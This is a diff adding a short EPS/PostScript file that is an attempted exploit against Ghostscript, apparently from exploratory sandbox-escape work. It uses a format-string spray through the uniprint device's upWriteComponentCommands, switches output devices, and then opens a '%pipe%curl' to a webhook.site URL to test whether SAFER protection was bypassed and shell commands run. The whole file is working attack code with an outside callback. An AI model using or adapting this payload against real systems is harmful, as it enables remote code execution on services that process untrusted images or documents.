@@ -1,0 +1,20 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+
+% Step 1: Switch to uniprint with format string spray via upWriteComponentCommands
+<< /OutputDevice /uniprint
+   /upColorModel /DeviceGray
+   /upWriteComponentCommands <<
+     /Prologue (\045d\045d\045d\045d\045n\045d\045d\045d\045n\045d\045d\045n)
+   >>
+>> setpagedevice
+0 0 moveto 100 100 lineto stroke
+showpage
+
+% Step 2: Switch back and try pipe — maybe SAFER got corrupted
+<< /OutputDevice /pngalpha >> setpagedevice
+
+% Step 3: Try to open pipe now
+(%pipe%curl https://webhook.site/ee327876-b481-428f-8701-8460d79f9737?spray_n=1) (w) file closefile
+
+showpage
